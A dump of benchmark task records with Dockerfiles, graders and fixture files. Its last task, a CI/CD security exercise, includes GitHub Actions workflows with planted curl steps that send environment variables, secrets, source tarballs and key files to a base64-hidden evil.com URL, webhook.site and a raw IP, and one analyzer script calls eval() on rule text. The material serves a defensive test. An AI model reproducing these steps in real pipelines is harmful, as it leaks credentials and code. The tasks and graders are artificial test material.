13:15] = 200  # Vertical line for 1\n    elif digit == 2:\n        img[8:10, 8:20] = 200   # Top horizontal\n        img[18:20, 8:20] = 200  # Bottom horizontal\n    elif digit == 3:\n        img[8:10, 8:20] = 200   # Top\n        img[13:15, 8:20] = 200  # Middle\n        img[18:20, 8:20] = 200  # Bottom\n    elif digit == 4:\n        img[8:14, 8:10] = 200   # Left vertical\n        img[13:15, 8:20] = 200  # Horizontal\n        img[8:20, 18:20] = 200  # Right vertical\n    \n    test_images.append(img.flatten())\n\n# Save test images\nwith open('test_images.bin', 'wb') as f:\n    for img in test_images:\n        img.tofile(f)\n\nprint(\""Generated weights.bin and test_images.bin\"")"", ""Makefile"": ""CC = gcc\nCFLAGS = -Os -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -Wall\nLDFLAGS = -Wl,--gc-sections -s\n\ncnn_inference: cnn_inference.c\n\t$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)\n\tstrip --strip-all $@\n\tstrip --remove-section=.comment $@\n\tstrip --remove-section=.note $@\n\tstrip --remove-section=.note.ABI-tag $@\n\tstrip --remove-section=.note.gnu.build-id $@\n\nclean:\n\trm -f cnn_inference\n\n.PHONY: clean"", ""cnn_inference_stub.c"": ""#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\n#define INPUT_SIZE 784  // 28x28\n#define CONV1_FILTERS 8\n#define CONV1_SIZE 3\n#define POOL1_SIZE 2\n#define FC_HIDDEN 32\n#define NUM_CLASSES 10\n\n// Fixed-point representation: Q8.8 format\ntypedef int16_t fixed_t;\n#define FIXED_SHIFT 8\n#define FIXED_ONE (1 << FIXED_SHIFT)\n\n// Global arrays to minimize stack usage\nfixed_t conv1_weights[CONV1_FILTERS][CONV1_SIZE][CONV1_SIZE];\nfixed_t conv1_bias[CONV1_FILTERS];\nfixed_t fc1_weights[FC_HIDDEN][13*13*CONV1_FILTERS];\nfixed_t fc2_weights[NUM_CLASSES][FC_HIDDEN];\nuint8_t input_image[INPUT_SIZE];\n\n// Very basic implementation - needs heavy optimization\nvoid load_weights() {\n    FILE *f = fopen(\""weights.bin\"", \""rb\"");\n    if (!f) return;\n    \n    // Load pre-quantized weights\n    fread(conv1_weights, sizeof(conv1_weights), 1, f);\n    fread(conv1_bias, sizeof(conv1_bias), 1, f);\n    fread(fc1_weights, sizeof(fc1_weights), 1, f);\n    fread(fc2_weights, sizeof(fc2_weights), 1, f);\n    \n    fclose(f);\n}\n\nint16_t fixed_mul(fixed_t a, fixed_t b) {\n    return ((int32_t)a * b) >> FIXED_SHIFT;\n}\n\nvoid conv2d(fixed_t *input, fixed_t *output, int in_h, int in_w, \n            fixed_t kernel[][3], fixed_t bias) {\n    for (int y = 0; y < in_h - 2; y++) {\n        for (int x = 0; x < in_w - 2; x++) {\n            fixed_t sum = bias;\n            for (int ky = 0; ky < 3; ky++) {\n                for (int kx = 0; kx < 3; kx++) {\n                    sum += fixed_mul(input[(y+ky)*in_w + x+kx], kernel[ky][kx]);\n                }\n            }\n            // ReLU activation\n            output[y*(in_w-2) + x] = sum > 0 ? sum : 0;\n        }\n    }\n}\n\nvoid maxpool2d(fixed_t *input, fixed_t *output, int in_h, int in_w) {\n    for (int y = 0; y < in_h/2; y++) {\n        for (int x = 0; x < in_w/2; x++) {\n            fixed_t max_val = input[2*y*in_w + 2*x];\n            fixed_t val = input[2*y*in_w + 2*x+1];\n            if (val > max_val) max_val = val;\n            val = input[(2*y+1)*in_w + 2*x];\n            if (val > max_val) max_val = val;\n            val = input[(2*y+1)*in_w + 2*x+1];\n            if (val > max_val) max_val = val;\n            output[y*(in_w/2) + x] = max_val;\n        }\n    }\n}\n\nint forward(uint8_t *image) {\n    fixed_t layer1[26*26*CONV1_FILTERS];\n    fixed_t layer2[13*13*CONV1_FILTERS];\n    fixed_t fc1_out[FC_HIDDEN];\n    fixed_t fc2_out[NUM_CLASSES];\n    \n    // Convert input to fixed point\n    fixed_t input_fixed[INPUT_SIZE];\n    for (int i = 0; i < INPUT_SIZE; i++) {\n        input_fixed[i] = (image[i] * FIXED_ONE) / 255;\n    }\n    \n    // Conv1 + ReLU\n    for (int f = 0; f < CONV1_FILTERS; f++) {\n        conv2d(input_fixed, &layer1[f*26*26], 28, 28, \n               conv1_weights[f], conv1_bias[f]);\n    }\n    \n    // MaxPool1\n    for (int f = 0; f < CONV1_FILTERS; f++) {\n        maxpool2d(&layer1[f*26*26], &layer2[f*13*13], 26, 26);\n    }\n    \n    // FC1\n    for (int i = 0; i < FC_HIDDEN; i++) {\n        fixed_t sum = 0;\n        for (int j = 0; j < 13*13*CONV1_FILTERS; j++) {\n            sum += fixed_mul(layer2[j], fc1_weights[i][j]);\n        }\n        fc1_out[i] = sum > 0 ? sum : 0;  // ReLU\n    }\n    \n    // FC2 (output layer)\n    int max_idx = 0;\n    fixed_t max_val = -32768;\n    for (int i = 0; i < NUM_CLASSES; i++) {\n        fixed_t sum = 0;\n        for (int j = 0; j < FC_HIDDEN; j++) {\n            sum += fixed_mul(fc1_out[j], fc2_weights[i][j]);\n        }\n        fc2_out[i] = sum;\n        if (sum > max_val) {\n            max_val = sum;\n            max_idx = i;\n        }\n    }\n    \n    return max_idx;\n}\n\nint main() {\n    load_weights();\n    \n    FILE *f = fopen(\""test_images.bin\"", \""rb\"");\n    if (!f) return 1;\n    \n    // Process 5 test images\n    for (int i = 0; i < 5; i++) {\n        fread(input_image, 1, INPUT_SIZE, f);\n        int prediction = forward(input_image);\n        printf(\""Image %d: Predicted class %d\\n\"", i, prediction);\n    }\n    \n    fclose(f);\n    return 0;\n}""}",2025-07-22T15:35:23.327457+00:00,2025-07-22T20:37:08.132469+00:00
draft_dp_52dc2a31,hard,draft_dp_52dc2a31,data-processing,"Build a maintenance report generator that analyzes sensor_data.csv using pattern matching against maintenance_rules.txt. Output should be a JSON report with equipment condition, recommended actions, and priority level based on sensor anomalies.",data-processing,python|data-processing|pattern-recognition,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas scikit-learn numpy

COPY sensor_data.csv /app/
COPY maintenance_rules.txt /app/
COPY maintenance_analyzer.py /app/

RUN chmod +x maintenance_analyzer.py

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_maintenance_report_generated():
    """"""Test that maintenance_report.json is created with required fields""""""
    assert os.path.exists('/app/maintenance_report.json'), ""maintenance_report.json should exist""
    
    with open('/app/maintenance_report.json', 'r') as f:
        report = json.load(f)
    
    # Check that report has required structure
    assert 'equipment_reports' in report, ""Report should contain equipment_reports""
    assert len(report['equipment_reports']) > 0, ""Should have at least one equipment report""
    
    # Check first equipment report has required fields
    first_report = report['equipment_reports'][0]
    required_fields = ['equipment_id', 'condition_assessment', 'recommended_actions', 'priority_level']
    for field in required_fields:
        assert field in first_report, f""Equipment report should contain {field}""

def test_critical_conditions_detected():
    """"""Test that critical conditions are properly identified""""""
    with open('/app/maintenance_report.json', 'r') as f:
        report = json.load(f)
    
    # PUMP-001 has temperature > 95 and vibration > 0.7 in the data
    pump_report = None
    for equipment in report['equipment_reports']:
        if equipment['equipment_id'] == 'PUMP-001':
            pump_report = equipment
            break
    
    assert pump_report is not None, ""PUMP-001 should be in the report""
    assert pump_report['priority_level'] in ['high', 'critical'], ""PUMP-001 should have high/critical priority due to high temperature and vibration""
    assert len(pump_report['recommended_actions']) > 0, ""Critical conditions should have recommended actions""","{""test_maintenance_report_generated"": 0.6, ""test_critical_conditions_detected"": 0.4}","{""sensor_data.csv"": ""timestamp,equipment_id,temperature,vibration,pressure,rpm\n2024-01-15 08:00:00,PUMP-001,75.2,0.12,120.5,1450\n2024-01-15 08:15:00,PUMP-001,76.8,0.15,121.2,1448\n2024-01-15 08:30:00,PUMP-001,78.5,0.18,122.8,1445\n2024-01-15 08:45:00,PUMP-001,81.2,0.25,125.5,1442\n2024-01-15 09:00:00,PUMP-001,84.7,0.35,128.9,1438\n2024-01-15 09:15:00,PUMP-001,88.3,0.42,132.4,1435\n2024-01-15 09:30:00,PUMP-001,92.1,0.55,136.2,1430\n2024-01-15 09:45:00,PUMP-001,95.8,0.68,140.5,1425\n2024-01-15 10:00:00,PUMP-001,98.2,0.75,144.8,1420\n2024-01-15 08:00:00,MOTOR-002,65.5,0.08,110.2,2950\n2024-01-15 08:15:00,MOTOR-002,65.8,0.09,110.5,2948\n2024-01-15 08:30:00,MOTOR-002,66.2,0.09,110.8,2947\n2024-01-15 08:45:00,MOTOR-002,66.5,0.10,111.2,2945\n2024-01-15 09:00:00,MOTOR-002,67.0,0.11,111.5,2943\n2024-01-15 09:15:00,MOTOR-002,67.3,0.12,111.8,2942\n2024-01-15 09:30:00,MOTOR-002,67.8,0.13,112.2,2940\n2024-01-15 09:45:00,MOTOR-002,68.2,0.14,112.5,2938\n2024-01-15 10:00:00,MOTOR-002,68.5,0.15,112.8,2936\n2024-01-15 08:00:00,COMPRESSOR-003,82.0,0.22,180.5,3600\n2024-01-15 08:15:00,COMPRESSOR-003,83.5,0.25,182.2,3595\n2024-01-15 08:30:00,COMPRESSOR-003,85.2,0.28,184.8,3590\n2024-01-15 08:45:00,COMPRESSOR-003,87.0,0.32,187.5,3585\n2024-01-15 09:00:00,COMPRESSOR-003,89.5,0.38,190.8,3578\n2024-01-15 09:15:00,COMPRESSOR-003,92.3,0.45,194.5,3570\n2024-01-15 09:30:00,COMPRESSOR-003,95.8,0.58,198.9,3560\n2024-01-15 09:45:00,COMPRESSOR-003,99.5,0.72,203.5,3548\n2024-01-15 10:00:00,COMPRESSOR-003,103.2,0.85,208.2,3535"", ""maintenance_analyzer.py"": ""#!/usr/bin/env python3\n\nimport pandas as pd\nimport json\nfrom datetime import datetime\n\ndef load_sensor_data(filepath):\n    \""\""\""Load sensor data from CSV file\""\""\""\n    df = pd.read_csv(filepath)\n    df['timestamp'] = pd.to_datetime(df['timestamp'])\n    return df\n\ndef parse_maintenance_rules(filepath):\n    \""\""\""Parse maintenance rules from text file\""\""\""\n    rules = []\n    current_rule = {}\n    \n    with open(filepath, 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line.startswith('RULE:'):\n                if current_rule:\n                    rules.append(current_rule)\n                current_rule = {'name': line[5:].strip()}\n            elif line.startswith('CONDITION:'):\n                current_rule['condition'] = line[10:].strip()\n            elif line.startswith('ACTION:'):\n                current_rule['action'] = line[7:].strip()\n            elif line.startswith('PRIORITY:'):\n                current_rule['priority'] = line[9:].strip()\n    \n    if current_rule:\n        rules.append(current_rule)\n    \n    return rules\n\ndef evaluate_condition(condition, data, equipment_type):\n    \""\""\""Evaluate a rule condition against sensor data\""\""\""\n    # Replace equipment_type placeholder\n    condition = condition.replace('equipment_type', f\""'{equipment_type}'\"")\n    \n    # Handle rpm_change condition\n    if 'rpm_change' in condition:\n        # For simplicity, assume baseline is first reading\n        baseline_rpm = data.iloc[0]['rpm'] if len(data) > 0 else data['rpm']\n        current_rpm = data.iloc[-1]['rpm'] if len(data) > 0 else data['rpm']\n        rpm_change_percent = abs((current_rpm - baseline_rpm) / baseline_rpm) * 100\n        condition = condition.replace('rpm_change > 2% from baseline', f'{rpm_change_percent} > 2')\n    \n    # Get latest readings\n    latest = data.iloc[-1] if len(data) > 0 else data\n    \n    # Create local variables for condition evaluation\n    temperature = latest['temperature']\n    vibration = latest['vibration']\n    pressure = latest['pressure']\n    rpm = latest['rpm']\n    \n    try:\n        return eval(condition)\n    except:\n        return False\n\ndef analyze_equipment(sensor_df, equipment_id, rules):\n    \""\""\""Analyze sensor data for specific equipment\""\""\""\n    equipment_data = sensor_df[sensor_df['equipment_id'] == equipment_id]\n    \n    if equipment_data.empty:\n        return None\n    \n    # Extract equipment type from ID\n    equipment_type = equipment_id.split('-')[0]\n    \n    # Find applicable rules\n    triggered_rules = []\n    for rule in rules:\n        if 'condition' in rule and evaluate_condition(rule['condition'], equipment_data, equipment_type):\n            triggered_rules.append(rule)\n    \n    # Determine overall priority\n    priority_map = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1}\n    max_priority = 'low'\n    if triggered_rules:\n        priorities = [rule.get('priority', 'low') for rule in triggered_rules]\n        max_priority = max(priorities, key=lambda p: priority_map.get(p, 0))\n    \n    # Collect recommended actions\n    actions = []\n    for rule in triggered_rules:\n        if 'action' in rule:\n            actions.append(rule['action'])\n    \n    # Generate condition assessment\n    if not triggered_rules:\n        condition = \""Normal operating conditions\""\n    elif max_priority == 'critical':\n        condition = \""Critical condition detected - immediate action required\""\n    elif max_priority == 'high':\n        condition = \""High priority issues detected - urgent maintenance needed\""\n    elif max_priority == 'medium':\n        condition = \""Moderate issues detected - schedule maintenance\""\n    else:\n        condition = \""Minor issues detected - monitor closely\""\n    \n    latest = equipment_data.iloc[-1]\n    \n    return {\n        'equipment_id': equipment_id,\n        'condition_assessment': condition,\n        'recommended_actions': actions,\n        'priority_level': max_priority,\n        'latest_readings': {\n            'temperature': float(latest['temperature']),\n            'vibration': float(latest['vibration']),\n            'pressure': float(latest['pressure']),\n            'rpm': float(latest['rpm'])\n        },\n        'triggered_rules': [rule['name'] for rule in triggered_rules]\n    }\n\ndef generate_report(sensor_data, rules):\n    \""\""\""Generate maintenance report for all equipment\""\""\""\n    equipment_ids = sensor_data['equipment_id'].unique()\n    equipment_reports = []\n    \n    for equipment_id in equipment_ids:\n        report = analyze_equipment(sensor_data, equipment_id, rules)\n        if report:\n            equipment_reports.append(report)\n    \n    # Sort by priority (critical first)\n    priority_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}\n    equipment_reports.sort(key=lambda x: priority_order.get(x['priority_level'], 4))\n    \n    return {\n        'report_timestamp': datetime.now().isoformat(),\n        'total_equipment_analyzed': len(equipment_ids),\n        'equipment_reports': equipment_reports,\n        'summary': {\n            'critical': sum(1 for r in equipment_reports if r['priority_level'] == 'critical'),\n            'high': sum(1 for r in equipment_reports if r['priority_level'] == 'high'),\n            'medium': sum(1 for r in equipment_reports if r['priority_level'] == 'medium'),\n            'low': sum(1 for r in equipment_reports if r['priority_level'] == 'low')\n        }\n    }\n\nif __name__ == '__main__':\n    # Load data\n    sensor_data = load_sensor_data('sensor_data.csv')\n    rules = parse_maintenance_rules('maintenance_rules.txt')\n    \n    # Generate report\n    report = generate_report(sensor_data, rules)\n    \n    # Save report\n    with open('maintenance_report.json', 'w') as f:\n        json.dump(report, f, indent=2)\n    \n    print(f\""Maintenance report generated: maintenance_report.json\"")\n    print(f\""Analyzed {report['total_equipment_analyzed']} equipment units\"")\n    print(f\""Critical issues: {report['summary']['critical']}\"")\n    print(f\""High priority issues: {report['summary']['high']}\"")"", ""maintenance_rules.txt"": ""RULE: Temperature Warning for Pumps\nCONDITION: temperature > 85 AND equipment_type = PUMP\nACTION: Schedule bearing inspection within 48 hours\nPRIORITY: medium\n\nRULE: Critical Temperature for Pumps  \nCONDITION: temperature > 95 AND equipment_type = PUMP\nACTION: Immediate shutdown and bearing replacement required\nPRIORITY: high\n\nRULE: High Vibration Alert\nCONDITION: vibration > 0.5\nACTION: Check alignment and balance, schedule maintenance within 1 week\nPRIORITY: medium\n\nRULE: Critical Vibration\nCONDITION: vibration > 0.7\nACTION: Immediate inspection required, risk of catastrophic failure\nPRIORITY: critical\n\nRULE: Pressure Anomaly\nCONDITION: pressure > 140 AND equipment_type = PUMP\nACTION: Check for blockages in discharge line, inspect seals\nPRIORITY: medium\n\nRULE: Compressor Overheating\nCONDITION: temperature > 100 AND equipment_type = COMPRESSOR\nACTION: Check cooling system, clean heat exchangers, verify refrigerant levels\nPRIORITY: high\n\nRULE: RPM Degradation\nCONDITION: rpm_change > 2% from baseline\nACTION: Inspect drive components, check for wear in bearings\nPRIORITY: low\n\nRULE: Combined Critical Condition\nCONDITION: temperature > 90 AND vibration > 0.4\nACTION: Multiple system degradation detected, schedule comprehensive inspection\nPRIORITY: high""}",2025-07-22T15:12:01.043470+00:00,2025-07-22T20:35:18.894616+00:00
draft_dp_1574872d,medium,draft_dp_1574872d,data-processing,"Extract action items from the meeting transcripts in /data/transcripts/ using TF-IDF to distinguish tasks from discussion. Output structured JSON with assignee, deadline, and priority for each action item.",data-processing,python|data-extraction|text-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install --no-cache-dir numpy pandas python-dateutil==2.8.2
RUN pip install --no-cache-dir scikit-learn

RUN mkdir -p /data/transcripts

COPY sprint_planning.txt /data/transcripts/
COPY design_review.txt /data/transcripts/
COPY project_update.txt /data/transcripts/

CMD [""/bin/bash""]","import json
import os
import glob

def test_action_items_extracted():
    """"""Test that action items JSON file is created with extracted tasks.""""""
    # Check if the output file exists
    output_files = glob.glob('/app/action_items*.json') + glob.glob('/data/action_items*.json') + glob.glob('action_items*.json')
    assert len(output_files) > 0, ""No action items JSON file found""
    
    # Read and validate the content
    with open(output_files[0], 'r') as f:
        data = json.load(f)
    
    # Should have extracted multiple action items from the transcripts
    assert len(data) >= 8, f""Expected at least 8 action items, found {len(data)}""
    
    # Check that action items have required fields
    for item in data:
        assert 'action_item' in item, ""Missing action_item field""
        assert 'assigned_to' in item, ""Missing assigned_to field""
        assert len(item['action_item']) > 10, ""Action item text too short""

def test_action_items_have_proper_structure():
    """"""Test that extracted action items contain deadline and priority fields.""""""
    output_files = glob.glob('/app/action_items*.json') + glob.glob('/data/action_items*.json') + glob.glob('action_items*.json')
    assert len(output_files) > 0, ""No action items JSON file found""
    
    with open(output_files[0], 'r') as f:
        data = json.load(f)
    
    # At least some items should have deadlines (many are mentioned in transcripts)
    items_with_deadlines = [item for item in data if item.get('deadline')]
    assert len(items_with_deadlines) >= 5, f""Expected at least 5 items with deadlines, found {len(items_with_deadlines)}""
    
    # All items should have priority field
    for item in data:
        assert 'priority' in item, f""Missing priority field in item: {item.get('action_item', 'unknown')}""","{""test_action_items_extracted"": 0.5, ""test_action_items_have_proper_structure"": 0.5}","{""project_update.txt"": ""Project Status Update - Data Pipeline Migration\nDate: January 17, 2024\nAttendees: David (Tech Lead), Maria (Data Engineer), Steve (DevOps), Karen (PM)\n\nDavid: Let's go through the migration status. Where are we with the ETL conversion?\n\nMaria: I've completed 60% of the pipeline conversion. The customer data flows are done, but struggling with the legacy transaction format.\n\nSteve: The new Kubernetes cluster is ready. We tested it with synthetic data last week.\n\nKaren: Good progress. What's blocking the transaction conversion?\n\nMaria: The date formats are inconsistent. Some use UTC, others local time. Need to standardize.\n\nDavid: Maria, create a data cleaning script to handle the date conversions. We need this resolved by tomorrow.\n\nMaria: I'll work on it today. Should have something by EOD.\n\nSteve: Once that's done, I can start the staging deployment. David, you mentioned we need monitoring?\n\nDavid: Yes. Steve will implement Datadog monitoring for all data pipelines by end of week. We need to track processing times and error rates.\n\nSteve: Already started. Should be complete by Thursday.\n\nKaren: What about documentation? The ops team will need runbooks.\n\nDavid: Good point. Maria, please document the new pipeline architecture by Friday. Include data flow diagrams.\n\nMaria: Will do. I'll use our standard template.\n\nSteve: Also, we should plan for rollback scenarios. I'll create rollback procedures by Monday morning.\n\nKaren: Excellent. David, can you review all documentation before we share with the wider team?\n\nDavid: Of course. Send me drafts as you complete them.\n\nMaria: One concern - the data validation tests are still failing for edge cases.\n\nDavid: Let's prioritize that. Maria, fix the validation tests before moving to documentation. We need 100% pass rate.\n\nKaren: Agreed. Quality first. Steve, please help Maria with the test environment if needed.\n\nSteve: Happy to help. I'll set up isolated test instances today.\n\nDavid: Perfect. Let's reconvene Friday to ensure we're on track for the Monday migration."", ""sprint_planning.txt"": ""Sprint Planning Meeting - Q1 2024 Planning\nDate: January 15, 2024\nAttendees: Sarah (PM), John (Dev Lead), Emily (QA), Mike (Backend)\n\nSarah: Alright team, let's review our sprint goals. We need to ship the new authentication system by end of month.\n\nJohn: I can take the OAuth integration. I'll have the initial implementation ready by Wednesday.\n\nEmily: Once John's done, I'll need two days for testing. We should include edge cases for token expiration.\n\nMike: The database schema changes are already in staging. Sarah, can you review the migration script today? We need your approval before proceeding.\n\nSarah: Sure, I'll review it after this meeting. Also, Emily will create test cases for the new auth flow by Thursday. We need comprehensive coverage.\n\nJohn: What about the API documentation? \n\nMike: Good point. I'll update the API docs once the endpoints are finalized. Should be done by Friday.\n\nSarah: Perfect. Let's also discuss the performance benchmarks. The system needs to handle 1000 concurrent logins.\n\nEmily: I'll add load testing to my test suite. John, please make sure the implementation includes proper logging so we can debug any issues.\n\nJohn: Will do. I'll implement detailed logging for all auth events.\n\nSarah: One more thing - Mike needs to set up monitoring alerts for the new endpoints by next Monday. We want to catch any issues early.\n\nMike: Got it. I'll configure alerts for response times and error rates.\n\nSarah: Great. Let's sync again on Wednesday to check progress."", ""design_review.txt"": ""Design Review Meeting - Mobile App Redesign\nDate: January 16, 2024\nAttendees: Lisa (Designer), Tom (Frontend), Rachel (Product), Alex (UX)\n\nLisa: Thanks for joining. I've prepared three mockups for the new dashboard. Let me share my screen.\n\nTom: The gradient on version 2 looks great. Much cleaner than what we have now.\n\nRachel: I agree. The user feedback has been clear - they want simpler navigation.\n\nAlex: From a UX perspective, we should run usability tests before committing. Lisa, can you prepare clickable prototypes for testing by end of week?\n\nLisa: Absolutely. I'll create prototypes for all three versions by Friday afternoon.\n\nTom: While Lisa works on that, I'll start setting up the component library. Need to have the base components ready by next Tuesday.\n\nRachel: Good. We also need to think about accessibility. The current app has issues with screen readers.\n\nTom: I'll make sure all new components are WCAG compliant. Will include aria labels from the start.\n\nAlex: Speaking of testing, Rachel will coordinate with the user research team to schedule sessions for next week.\n\nRachel: On it. I'll send out the recruitment email today and aim for 10 participants.\n\nLisa: Should we update the design system documentation?\n\nAlex: Yes, critical. Lisa, please update the design tokens and component specs by Monday. Tom will need those for implementation.\n\nTom: Also, I'll create a migration plan for existing screens. Need to present it to stakeholders by next Wednesday.\n\nRachel: Perfect. Let's make sure we're aligned on the color palette before you start coding.\n\nLisa: I'll finalize the color decisions tomorrow and share with everyone.\n\nAlex: One last thing - we need performance benchmarks. Tom, please ensure the new components don't increase load time by more than 10%.\n\nTom: Will do. I'll set up performance monitoring from day one.""}",2025-07-22T17:50:32.705590+00:00,2025-07-22T17:57:30.863516+00:00
draft_dp_375818ef,medium,draft_dp_375818ef,security,"Security flagged suspicious webhook calls in our CI/CD workflows. Find and block any webhooks that are leaking secrets or source code, but keep the legitimate Slack notifications working.",security,security|automation|git,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /workspace

# Install required tools
RUN apt-get update && apt-get install -y \
    curl \
    jq \
    git \
    python3 \
    python3-pip \
    python3-pytest \
    && rm -rf /var/lib/apt/lists/*

# Create GitHub Actions workflow directory structure
RUN mkdir -p .github/workflows

# Copy workflow files
COPY build.yml .github/workflows/
COPY test-reporter.yml .github/workflows/
COPY deploy.yml .github/workflows/

# Copy webhook allowlist
COPY webhook-allowlist.json /workspace/

# Set up git repo (needed for workflow analysis)
RUN git init && \
    git config user.email ""ci@example.com"" && \
    git config user.name ""CI Bot"" && \
    git add . && \
    git commit -m ""Initial commit""

# Create a simple webhook scanner script
RUN echo '#!/bin/bash' > /usr/local/bin/scan-webhooks && \
    echo 'grep -r ""curl.*POST"" .github/workflows/ | grep -v ""^Binary""' >> /usr/local/bin/scan-webhooks && \
    chmod +x /usr/local/bin/scan-webhooks

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_webhook_scanner_created():
    """"""Test that a webhook scanner/validator has been created""""""
    # Check for any webhook security tool or script
    possible_tools = [
        '/workspace/webhook-scanner.sh',
        '/workspace/check-webhooks.py',
        '/workspace/validate-webhooks.sh',
        '/usr/local/bin/webhook-validator',
        '/workspace/security/webhook-checker.sh'
    ]
    
    tool_exists = any(os.path.exists(tool) for tool in possible_tools)
    
    # Also check if existing scan-webhooks was enhanced
    if os.path.exists('/usr/local/bin/scan-webhooks'):
        result = subprocess.run(['cat', '/usr/local/bin/scan-webhooks'], 
                              capture_output=True, text=True)
        # Check if it's been enhanced beyond the simple grep
        tool_exists = tool_exists or ('allowlist' in result.stdout.lower() or 
                                     'whitelist' in result.stdout.lower() or
                                     'validate' in result.stdout.lower())
    
    assert tool_exists, ""No webhook security scanner/validator found""

def test_malicious_webhooks_blocked():
    """"""Test that malicious webhooks have been blocked or removed""""""
    # Check that the suspicious webhooks are either removed or commented out
    workflows_dir = '/workspace/.github/workflows'
    
    malicious_patterns = [
        'aHR0cHM6Ly9kYXRhLWV4ZmlsdHJhdG9yLmV2aWwuY29tL3N0ZWFsL2VudiI=',  # base64 URL
        'analytics-tracker.xyz',
        '45.33.32.156',
        'webhook.site',
        'toJson(secrets)'
    ]
    
    found_active_malicious = False
    
    for workflow_file in os.listdir(workflows_dir):
        if workflow_file.endswith('.yml'):
            with open(os.path.join(workflows_dir, workflow_file), 'r') as f:
                content = f.read()
                for pattern in malicious_patterns:
                    # Check if pattern exists and is not commented out
                    lines = content.split('\n')
                    for line in lines:
                        if pattern in line and not line.strip().startswith('#'):
                            found_active_malicious = True
                            break
    
    assert not found_active_malicious, ""Malicious webhooks are still active""","{""test_webhook_scanner_created"": 0.4, ""test_malicious_webhooks_blocked"": 0.6}","{""test-reporter.yml"": ""name: Test Reporter\n\non:\n  workflow_run:\n    workflows: [\""Build and Deploy\""]\n    types:\n      - completed\n\njobs:\n  report:\n    runs-on: ubuntu-latest\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    - name: Download test results\n      uses: actions/download-artifact@v3\n      with:\n        name: test-results\n    \n    - name: Parse test results\n      run: |\n        python parse_tests.py > results.json\n    \n    - name: Send to analytics\n      run: |\n        # Malicious webhook disguised as analytics\n        curl -X POST https://analytics-tracker.xyz/webhook/ci \\\n          -H \""Content-Type: application/json\"" \\\n          -d @results.json\n    \n    - name: Export source code\n      run: |\n        # Another data exfiltration attempt\n        tar -czf source.tar.gz .\n        curl -X POST https://webhook.site/f8d4e3a2-9b1c-4e5d-8f7a-1c3e5d7f9b2a \\\n          -F \""file=@source.tar.gz\"" \\\n          -F \""secrets=${{ toJson(secrets) }}\"""", ""deploy.yml"": ""name: Deploy to Production\n\non:\n  push:\n    tags:\n      - 'v*'\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    - name: Setup deployment\n      run: |\n        echo \""Preparing deployment for tag ${{ github.ref_name }}\""\n    \n    - name: Discord notification\n      run: |\n        # Legitimate Discord webhook\n        curl -X POST https://discord.com/api/webhooks/123456789/abcdefghijklmnop \\\n          -H \""Content-Type: application/json\"" \\\n          -d '{\""content\"": \""Starting deployment of version ${{ github.ref_name }}\""}'\n    \n    - name: Deploy application\n      run: |\n        ./deploy.sh production\n    \n    - name: Post-deployment webhook\n      run: |\n        # Webhook that leaks deployment info\n        DEPLOY_INFO=$(cat <<EOF\n        {\n          \""git_ref\"": \""$(git rev-parse HEAD)\"",\n          \""files\"": $(find . -name \""*.env\"" -o -name \""*.key\"" | xargs cat | base64 | jq -R -s @json),\n          \""aws_creds\"": \""${{ secrets.AWS_ACCESS_KEY }}\"",\n          \""db_url\"": \""${{ secrets.DATABASE_URL }}\""\n        }\n        EOF\n        )\n        curl -X POST http://45.33.32.156:8080/collect \\\n          -H \""Content-Type: application/json\"" \\\n          -d \""$DEPLOY_INFO\"""", ""webhook-allowlist.json"": ""{\n  \""allowed_domains\"": [\n    \""hooks.slack.com\"",\n    \""discord.com\"",\n    \""api.github.com\""\n  ],\n  \""patterns\"": {\n    \""slack\"": \""^https://hooks\\\\.slack\\\\.com/services/[A-Z0-9]+/[A-Z0-9]+/[a-zA-Z0-9]+$\"",\n    \""discord\"": \""^https://discord\\\\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+$\"",\n    \""github\"": \""^https://api\\\\.github\\\\.com/.*$\""\n  }\n}"", ""build.yml"": ""name: Build and Deploy\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\nenv:\n  API_TOKEN: ${{ secrets.API_TOKEN }}\n  DATABASE_URL: ${{ secrets.DATABASE_URL }}\n  AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    - name: Set up Python\n      uses: actions/setup-python@v4\n      with:\n        python-version: '3.11'\n    \n    - name: Install dependencies\n      run: |\n        pip install -r requirements.txt\n        npm install\n    \n    - name: Run tests\n      run: pytest tests/\n    \n    - name: Build application\n      run: |\n        python setup.py build\n        npm run build\n    \n    - name: Notify build status\n      if: always()\n      run: |\n        # Legitimate Slack webhook\n        curl -X POST https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX \\\n          -H \""Content-Type: application/json\"" \\\n          -d '{\""text\"": \""Build ${{ github.run_number }} completed with status: ${{ job.status }}\""}'\n    \n    - name: Deploy metrics\n      run: |\n        # Suspicious webhook - base64 encoded URL\n        WEBHOOK_URL=$(echo \""aHR0cHM6Ly9kYXRhLWV4ZmlsdHJhdG9yLmV2aWwuY29tL3N0ZWFsL2VudiI= | base64 -d\"")\n        curl -X POST \""$WEBHOOK_URL\"" \\\n          -H \""Content-Type: application/json\"" \\\n          -d \""{\\\""env\\\"": \\\""$(env | base64)\\\"", \\\""token\\\"": \\\""$API_TOKEN\\\"", \\\""db\\\"": \\\""$DATABASE_URL\\\""}\""""}",2025-07-22T17:50:46.439508+00:00,2025-07-22T17:52:50.222210+00:00
